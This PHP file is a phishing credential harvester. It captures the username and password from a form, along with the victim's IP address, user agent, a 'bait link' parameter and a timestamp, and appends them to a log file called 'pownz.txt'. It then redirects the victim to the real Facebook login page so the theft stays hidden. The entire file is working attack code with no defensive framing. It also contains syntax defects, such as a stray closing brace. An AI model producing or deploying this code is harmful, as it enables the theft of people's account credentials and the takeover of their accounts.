<?php

              $password = $_POST['password'];
              $username = $_POST['username'];
              $user = $_SERVER['HTTP_USER_AGENT'];
              $heure = date("H:i");
              $date = date("d-m-Y");
              $r = chr(13); 
              $ip = get_ip();
              
              function get_ip() {
	// IP si internet partagé
	if (isset($_SERVER['HTTP_CLIENT_IP'])) {
		return $_SERVER['HTTP_CLIENT_IP'];
	}
	// IP derrière un proxy
	elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		return $_SERVER['HTTP_X_FORWARDED_FOR'];
	}
	// Sinon : IP normale
	else {
		return (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '');
	}
}
$l0 = "Bait link was is : " . $_GET['video'];
$l1 = "===========================";
$l2 = "Username is : $username";
$l3 = "---------------------------";
$l4 = "Password is : $password";
$l5 = "---------------------------";
$l6 = "IP Adress is : $ip";
$l7 = "---------------------------";
$l8 = "User Agent is : $user";
$l9 = "---------------------------";
$l10 = "Connected at $heure on $date";
$l11 = "===========================";   
  
  $myFile = "pownz.txt";
$fh = fopen($myFile, 'a+') or die("can't open file");
fwrite($fh, $r);
fwrite($fh, $r);
fwrite($fh, $l1);
fwrite($fh, $r);
fwrite($fh, $l0);
fwrite($fh, $r);
fwrite($fh, $l1);
fwrite($fh, $r);
fwrite($fh, $l2);
fwrite($fh, $r);
fwrite($fh, $l3);
fwrite($fh, $r);
fwrite($fh, $l4);
fwrite($fh, $r);
fwrite($fh, $l5);
fwrite($fh, $r);
fwrite($fh, $l6);
fwrite($fh, $r);
fwrite($fh, $l7);
fwrite($fh, $r);
fwrite($fh, $l8);
fwrite($fh, $r);
fwrite($fh, $l9);
fwrite($fh, $r);
fwrite($fh, $l10);
fwrite($fh, $r);
fwrite($fh, $l11);
fclose($fh);
         
            $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
   function before ($this, $inthat)
    {
        return substr($inthat, 0, strpos($inthat, $this));
    };
   
    $lang2 = before (',', $lang);
    
        header('Location: https://www.facebook.com/login.php?lang=fr&trynum=1&?login_attempt=1&amp;lwv=110&email='.$username);
        die();
}

?>
